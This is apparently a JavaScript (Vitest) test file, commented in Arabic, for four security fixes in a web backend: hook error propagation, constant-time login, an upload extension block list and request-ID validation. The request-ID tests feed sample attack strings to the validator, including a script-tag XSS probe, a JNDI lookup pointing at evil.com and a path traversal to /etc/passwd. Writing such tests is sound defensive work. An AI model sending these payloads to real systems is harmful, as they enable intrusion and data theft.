/**
 * tests/security-c1-c4.test.js
 *
 * وحدات اختبار للإصلاحات الأمنية C1–C4:
 *   C1 — crudFactory لا يبتلع أخطاء الـ hooks بصمت
 *   C2 — دالة تسجيل الدخول تعمل بوقت ثابت (constant-time) لمنع enumeration
 *   C3 — multer fileFilter يرفض الامتدادات الخطيرة قبل الكتابة على القرص
 *   C4 — X-Request-Id يُتحقق منه بـ regex قبل قبوله في الـ logs
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import bcrypt from 'bcrypt';

// ─── C1: crudFactory hook propagation ─────────────────────────────────────────
// نتحقق بالكود المباشر: إزالة try/catch يجعل الأخطاء تنتشر للـ asyncHandler
// الذي يُحوّلها لـ 500 — لا نحتاج integration لهذا الاختبار المنطقي.
describe('C1 — crudFactory hook error propagation', () => {
  it('afterCreate error propagates when no try/catch wraps it', async () => {
    const hookError = new Error('audit log DB failed');
    const afterCreate = vi.fn().mockRejectedValue(hookError);

    // محاكاة كود crudFactory بعد الإصلاح (بدون try/catch)
    const runHook = async () => {
      if (afterCreate) { await afterCreate({}); }
    };

    await expect(runHook()).rejects.toThrow('audit log DB failed');
    expect(afterCreate).toHaveBeenCalledOnce();
  });

  it('afterUpdate error propagates when no try/catch wraps it', async () => {
    const afterUpdate = vi.fn().mockRejectedValue(new Error('afterUpdate failed'));
    const runHook = async () => { if (afterUpdate) { await afterUpdate({}, {}); } };
    await expect(runHook()).rejects.toThrow('afterUpdate failed');
  });

  it('afterDelete error propagates when no try/catch wraps it', async () => {
    const afterDelete = vi.fn().mockRejectedValue(new Error('afterDelete failed'));
    const snapshot = { id: 'x' };
    const runHook = async () => { if (afterDelete && snapshot) { await afterDelete(snapshot, {}); } };
    await expect(runHook()).rejects.toThrow('afterDelete failed');
  });

  it('snapshot fetch failure is logged but does not block delete', async () => {
    // بعد الإصلاح: catch (e) { console.error(...) } — لا يوقف العملية
    const consoleError = vi.spyOn(console, 'error').mockImplementation(() => {});
    let snapshotFailed = false;
    let deleteCalled = false;

    try {
      // محاكاة الـ snapshot fetch الفاشل
      try {
        throw new Error('DB timeout');
      } catch (e) {
        console.error('[crud] snapshot fetch failed:', e.message);
        snapshotFailed = true;
      }
      // العملية تكمل رغم فشل الـ snapshot
      deleteCalled = true;
    } catch {
      // لا يجب أن يصل هنا
    }

    expect(snapshotFailed).toBe(true);
    expect(deleteCalled).toBe(true);
    expect(consoleError).toHaveBeenCalledWith('[crud] snapshot fetch failed:', 'DB timeout');
    consoleError.mockRestore();
  });
});

// ─── C2: Login timing attack prevention ───────────────────────────────────────
describe('C2 — login constant-time protection', () => {
  // DUMMY_HASH المُعرَّف في auth.js — نعيد تعريفه هنا للاختبار
  const DUMMY_HASH = '$2b$12$WFB5uanHbLsJwkAhS9YYjeWOtm0LCmhKTJmRomUgeBXZNRUt1aMHK';

  it('DUMMY_HASH is a valid bcrypt hash at cost 12', () => {
    // التحقق من البنية: $2b$12$...
    expect(DUMMY_HASH).toMatch(/^\$2b\$12\$/);
    // طوله 60 محرف (bcrypt standard)
    expect(DUMMY_HASH).toHaveLength(60);
  });

  it('DUMMY_HASH does NOT match any real password', async () => {
    // التحقق أن الـ DUMMY_HASH لا يطابق كلمات مرور شائعة
    const commonPasswords = ['password', '123456', 'admin', ''];
    for (const pw of commonPasswords) {
      const matches = await bcrypt.compare(pw, DUMMY_HASH);
      expect(matches).toBe(false);
    }
  }, 15_000);

  it('constant-time branch: user not found → uses DUMMY_HASH', async () => {
    // محاكاة منطق auth.js بعد الإصلاح
    const user = null; // المستخدم غير موجود
    const password = 'somePassword';

    const hashToCompare = (user?.active && user?.passwordHash) ? user.passwordHash : DUMMY_HASH;
    // يجب أن يستخدم DUMMY_HASH
    expect(hashToCompare).toBe(DUMMY_HASH);

    // bcrypt.compare دائماً يُستدعى — يضمن نفس وقت الاستجابة
    const ok = await bcrypt.compare(password, hashToCompare);
    expect(ok).toBe(false); // لا يطابق
  }, 10_000);

  it('constant-time branch: user inactive → uses DUMMY_HASH', async () => {
    const user = { active: false, passwordHash: 'realHash', id: 'u1' };
    const hashToCompare = (user?.active && user?.passwordHash) ? user.passwordHash : DUMMY_HASH;
    expect(hashToCompare).toBe(DUMMY_HASH);
  });

  it('constant-time branch: active user → uses real passwordHash', async () => {
    const realHash = await bcrypt.hash('correctPassword', 10);
    const user = { active: true, passwordHash: realHash, id: 'u1' };
    const hashToCompare = (user?.active && user?.passwordHash) ? user.passwordHash : DUMMY_HASH;
    expect(hashToCompare).toBe(realHash);

    const ok = await bcrypt.compare('correctPassword', hashToCompare);
    expect(ok).toBe(true);
  }, 10_000);
});

// ─── C3: File upload extension blocklist ──────────────────────────────────────
describe('C3 — dangerous extension blocklist', () => {
  // نسخة من DANGEROUS_EXTENSIONS في documents.js
  const DANGEROUS_EXTENSIONS = new Set([
    '.exe', '.dll', '.com', '.bat', '.cmd', '.ps1', '.psm1', '.vbs', '.vbe',
    '.js', '.jsx', '.ts', '.tsx', '.mjs', '.cjs',
    '.php', '.php3', '.php4', '.php5', '.phtml',
    '.py', '.rb', '.pl', '.sh', '.bash', '.zsh', '.fish',
    '.jar', '.war', '.ear', '.class',
    '.asp', '.aspx', '.cer', '.cgi',
    '.htaccess', '.htpasswd',
  ]);

  // محاكاة fileFilter بعد الإصلاح
  const fileFilter = (filename, mimetype) => {
    const ext = require('path').extname(filename).toLowerCase();
    if (DANGEROUS_EXTENSIONS.has(ext)) {
      return { ok: false, reason: `امتداد الملف "${ext}" غير مسموح به لأسباب أمنية` };
    }
    const allowed = [
      'application/pdf', 'application/msword',
      'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      'application/vnd.ms-excel',
      'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      'image/jpeg', 'image/png',
    ];
    if (allowed.includes(mimetype)) return { ok: true };
    return { ok: false, reason: 'نوع الملف غير مسموح به' };
  };

  it('rejects .exe files regardless of MIME type', () => {
    const result = fileFilter('malware.exe', 'application/pdf');
    expect(result.ok).toBe(false);
    expect(result.reason).toContain('.exe');
  });

  it('rejects .php files regardless of MIME type', () => {
    const result = fileFilter('shell.php', 'image/jpeg');
    expect(result.ok).toBe(false);
    expect(result.reason).toContain('.php');
  });

  it('rejects .sh files', () => {
    expect(fileFilter('exploit.sh', 'text/plain').ok).toBe(false);
  });

  it('rejects .js files (even spoofed as PDF)', () => {
    expect(fileFilter('payload.js', 'application/pdf').ok).toBe(false);
  });

  it('rejects .py files', () => {
    expect(fileFilter('script.py', 'application/pdf').ok).toBe(false);
  });

  it('rejects .htaccess files', () => {
    expect(fileFilter('.htaccess', 'text/plain').ok).toBe(false);
  });

  it('rejects case-insensitive extensions (.PHP, .EXE)', () => {
    expect(fileFilter('shell.PHP', 'application/pdf').ok).toBe(false);
    expect(fileFilter('malware.EXE', 'application/pdf').ok).toBe(false);
  });

  it('accepts valid PDF files', () => {
    const result = fileFilter('document.pdf', 'application/pdf');
    expect(result.ok).toBe(true);
  });

  it('accepts valid DOCX files', () => {
    const result = fileFilter('report.docx',
      'application/vnd.openxmlformats-officedocument.wordprocessingml.document');
    expect(result.ok).toBe(true);
  });

  it('accepts valid JPEG images', () => {
    expect(fileFilter('photo.jpg', 'image/jpeg').ok).toBe(true);
  });

  it('rejects unknown MIME type even with safe extension', () => {
    // .txt ليس في قائمة الخطرة لكن MIME غير مقبول
    expect(fileFilter('notes.txt', 'text/plain').ok).toBe(false);
  });
});

// ─── C4: X-Request-Id validation ─────────────────────────────────────────────
describe('C4 — X-Request-Id log injection prevention', () => {
  const SAFE_REQUEST_ID_RE = /^[a-zA-Z0-9._:\-]{1,80}$/;

  const processRequestId = (incoming) => {
    return (incoming && SAFE_REQUEST_ID_RE.test(incoming)) ? incoming : null; // null = generate UUID
  };

  it('accepts valid alphanumeric request IDs', () => {
    expect(processRequestId('abc123')).toBe('abc123');
    expect(processRequestId('req-20240101-xyz')).toBe('req-20240101-xyz');
    expect(processRequestId('550e8400-e29b-41d4-a716-446655440000')).toBe('550e8400-e29b-41d4-a716-446655440000');
  });

  it('accepts IDs with allowed punctuation (. : - _)', () => {
    expect(processRequestId('trace.id:v1-test')).toBeTruthy();
    expect(processRequestId('req_2024.01.01:001')).toBeTruthy();
  });

  it('rejects IDs with newlines (log injection vector)', () => {
    expect(processRequestId('legit\nfake-log-entry')).toBeNull();
    expect(processRequestId('legit\rfake')).toBeNull();
  });

  it('rejects IDs with spaces', () => {
    expect(processRequestId('has space')).toBeNull();
  });

  it('rejects IDs with special characters', () => {
    expect(processRequestId('<script>alert(1)</script>')).toBeNull();
    expect(processRequestId('${jndi:ldap://evil.com/x}')).toBeNull();
    expect(processRequestId('../../../etc/passwd')).toBeNull();
  });

  it('rejects IDs longer than 80 characters', () => {
    const longId = 'a'.repeat(81);
    expect(processRequestId(longId)).toBeNull();
  });

  it('accepts IDs exactly 80 characters long', () => {
    const maxId = 'a'.repeat(80);
    expect(processRequestId(maxId)).toBe(maxId);
  });

  it('rejects empty string', () => {
    expect(processRequestId('')).toBeNull();
  });

  it('rejects null/undefined → falls back to UUID', () => {
    expect(processRequestId(null)).toBeNull();
    expect(processRequestId(undefined)).toBeNull();
  });

  it('rejects tab characters', () => {
    expect(processRequestId('req\tid')).toBeNull();
  });
});
